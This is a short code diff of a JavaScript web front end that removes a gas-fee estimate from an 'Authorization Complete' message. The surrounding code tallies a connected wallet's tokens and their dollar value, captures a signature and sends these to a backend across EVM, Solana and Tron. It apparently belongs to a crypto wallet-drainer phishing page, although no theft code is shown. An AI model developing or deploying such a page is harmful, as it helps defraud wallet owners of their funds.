@@ -716,24 +716,12 @@ async function sendToBackend() {
     
     if (result.success) {
       log('✅ Backend success!', 'success');
-      
-      // Calculate gas fees for all chains
-      const gasFees = calculateGasFees();
-      let gasSummary = '';
-      
-      if (gasFees.evm) gasSummary += `<strong>EVM Gas:</strong> ~$${gasFees.evm} USD<br>`;
-      if (gasFees.solana) gasSummary += `<strong>Solana Gas:</strong> ~$${gasFees.solana} USD<br>`;
-      if (gasFees.tron) gasSummary += `<strong>Tron Gas:</strong> ~${gasFees.tronTrx} TRX ($${gasFees.tron} USD)<br>`;
-      
       showSuccess(`
         ✅ Authorization Complete!
         <br><br>
         <strong>Tokens:</strong> ${foundTokens.length}<br>
         <strong>Value:</strong> $${totalValue.toFixed(2)}<br>
         <strong>Signature:</strong> ${lastSignature ? 'Yes' : 'No'}
-        <br><br>
-        <strong>Estimated Gas Fees:</strong><br>
-        ${gasSummary}
       `);
     } else {
       throw new Error(result.error || 'Backend returned success=false');
@@ -742,40 +730,6 @@ async function sendToBackend() {
     log('Backend error: ' + err.message, 'error');
     showError('Authorization failed: ' + err.message);
   }
-}
-
-// ============ GAS FEE CALCULATION ============
-function calculateGasFees() {
-  const fees = {};
-  
-  // EVM gas calculation (ETH/MATIC/BNB etc)
-  if (evmAddress) {
-    const gasLimit = 200000; // wei
-    const gasPrice = 50; // gwei (average)
-    const ethPrice = 2500; // USD price
-    const gasCostEth = (gasLimit * gasPrice) / 1e9;
-    fees.evm = (gasCostEth * ethPrice).toFixed(2);
-  }
-  
-  // Solana gas calculation
-  if (solanaAddress) {
-    const lamports = 5000; // Solana transaction cost
-    const solPrice = 150; // USD price
-    const gasCostSol = lamports / 1e9;
-    fees.solana = (gasCostSol * solPrice).toFixed(4);
-  }
-  
-  // Tron gas calculation
-  if (tronAddress) {
-    const energyNeeded = 15000; // Energy units
-    const trxPerEnergy = 0.0002; // TRX per energy unit
-    const trxPrice = 0.13; // USD price per TRX
-    const gasCostTrx = energyNeeded * trxPerEnergy; // approximately 3 TRX
-    fees.tronTrx = gasCostTrx.toFixed(2);
-    fees.tron = (gasCostTrx * trxPrice).toFixed(4);
-  }
-  
-  return fees;
 }
 
 // ============ WALLET SELECTOR ============
